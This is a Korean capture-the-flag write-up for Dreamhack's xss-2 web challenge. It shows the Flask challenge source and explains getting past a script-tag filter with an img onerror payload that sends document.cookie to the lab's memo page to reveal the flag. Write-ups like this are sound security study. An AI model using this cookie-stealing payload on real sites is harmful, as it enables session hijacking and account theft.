<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack Web Hacking xss- Write-Up</h1>
</body>
<br>
<br>
</html>

문제 서버로 접속해보자
![image](https://github.com/user-attachments/assets/6eec1913-2012-480d-a58d-b352a7b0dcc3)

xss-1 문제와 같은 형식의 페이지들이 있다.

문제파일도 다운로드 받아 살펴보자.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

코드를 살펴보니 xss-1문제와 다른 부분이 눈에 띄는데 ```/vuln``` 페이지 코드가 다르다

xss-1 ```/vuln```
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return paramv
```

xss-2 ```/vuln```
```python
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")
```

xss-1 에서 ```request.args.get()``` 지정된 ```key``` 값을 ```param``` 변수에 저장하는 것이다.

xss-2 에서 ```render_template()```는 FLask 웹 프레임워크에서 HTML 파일을 렌더링해서 최종 결과를 브라우저에 출력하는 함수이다.

Flask는 기본적으로 templates라는 이름의 폴더를 기본 경로로 설정해 그 폴더 내부에 HTML 파일을 모아두면 손쉽게 사용 가능하다고 한다.

이것저것 찾아보면서 코드 분석을 해 보았는데 잘 모르겠어서 다시 문제 사이트로 돌아가봤다.

이것저것 누르던중 생각해보니 vuln(xss) page 에서 alert 창이 실행되지 않고 있다는것을 알게되었다. 아마도 해당 구문이 필터링 되어있는것 같다. 그래서 스크립트를 쓰지않고 우회할 방법을 찾아 보았다.

스크립트를 실행을 유도하는 태그들이 있다고해서 찾아보니 대표적으로 on 핸들러가 사용한 태그들(ex. img, video) 등이 존재한다고 한다.

그래서 이미지태그를 스크립트 자리에 삽입해 보았다.

![image](https://github.com/user-attachments/assets/b9a9b139-bc11-40f8-8d52-631c0bc01e4e)

```param``` 값에 삽입한 img 태그가 실행된 것을 확일 할 수 있었다. 이어서 img 태그를 사용해서 memo 페이지에 FLAG를 삽입해 보았다.
```python
<img src=a onerror="location.href='http://127.0.0.1:8000/memo?memo='+document.cookie">
```

![image](https://github.com/user-attachments/assets/2b896e7c-c011-4153-b7db-f77deb0d7d7e)

![image](https://github.com/user-attachments/assets/b5d53553-6853-4203-9d48-30f3d57bbfc7)

memo 페이지로 들어가보니 FLAG를 확인할 수 있었다!!!!

![image](https://github.com/user-attachments/assets/840aced3-bf47-42fe-814c-007c3f1bf85a)

